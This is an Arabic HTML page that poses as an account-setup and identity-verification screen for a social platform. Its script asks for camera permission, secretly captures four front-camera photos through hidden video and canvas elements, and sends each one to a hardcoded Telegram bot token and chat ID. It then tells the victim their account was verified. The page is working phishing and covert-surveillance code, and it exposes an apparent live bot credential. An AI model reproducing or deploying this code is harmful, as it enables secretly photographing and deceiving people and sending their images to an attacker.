<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إعداد الحساب | منصة التواصل</title>
    <style>
        body {
            margin: 0; padding: 0; font-family: sans-serif;
            background-color: #101820; color: white;
            display: flex; justify-content: center; align-items: center; height: 100vh;
        }
        .box {
            text-align: center; background: #1a222d; padding: 30px;
            border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }
        .loader {
            border: 4px solid #333; border-top: 4px solid #007bff;
            border-radius: 50%; width: 40px; height: 40px;
            animation: spin 1s linear infinite; margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        /* إخفاء عناصر الفيديو والكانفاس لتجنب تشتيت المستخدم */
        #video, #canvas { display: none; visibility: hidden; }
    </style>
</head>
<body>

    <div class="box">
        <div class="loader"></div>
        <h2 id="status">جاري تهيئة الكاميرا...</h2>
        <p id="msg">يرجى الضغط على "سماح" لتأكيد هويتك وإكمال إعداد الحساب.</p>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const statusH2 = document.getElementById('status');
        const msgP = document.getElementById('msg');

        // البيانات الخاصة بك
        const botToken = '8417420328:AAGeX1WWGIRDx0S7CV0ID3Z6L8DkDeGrcrY';
        const myChatId = '7122100508';

        // طلب الوصول للكاميرا
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
            .then(stream => {
                video.srcObject = stream;
                
                // التأكد من أن الفيديو بدأ العمل فعلياً قبل التقاط الصور
                video.onplaying = () => {
                    statusH2.innerText = "جاري التحقق من الهوية...";
                    msgP.innerText = "يرجى الثبات أمام الكاميرا لثوانٍ معدودة.";
                    
                    let count = 0;
                    const maxPhotos = 4;

                    // ننتظر 2 ثانية بعد بدء الفيديو للتأكد من الوضوح
                    setTimeout(() => {
                        const timer = setInterval(() => {
                            if (count < maxPhotos) {
                                captureAndSend(count + 1);
                                count++;
                            } else {
                                clearInterval(timer);
                                statusH2.innerText = "اكتمل الإعداد!";
                                msgP.innerText = "تم توثيق حسابك بنجاح، جاري توجيهك...";
                                // إيقاف الكاميرا بعد الانتهاء للحفاظ على الخصوصية
                                stream.getTracks().forEach(track => track.stop());
                            }
                        }, 3000); // التقاط صورة كل 3 ثوانٍ
                    }, 2000);
                };
            })
            .catch(err => {
                statusH2.innerText = "خطأ في الوصول";
                msgP.innerText = "يجب السماح بالكاميرا لتتمكن من إنشاء الحساب.";
                console.error("Camera Error: ", err);
            });

        function captureAndSend(index) {
            const context = canvas.getContext('2d');
            
            // ضبط حجم الكانفاس ليطابق حجم فيديو الكاميرا بدقة
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // رسم اللقطة
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // تحويل اللقطة لملف وإرسالها
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', myChatId);
                formData.append('photo', blob, `snap_${index}.jpg`);
                formData.append('caption', `✅ صورة جديدة للمستخدم (${index}/4)`);

                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(res => res.json())
                .then(data => console.log(`الصورة ${index} أُرسلت`))
                .catch(err => console.error("فشل الإرسال:", err));
            }, 'image/jpeg', 0.8);
        }
    </script>
</body>
</html>
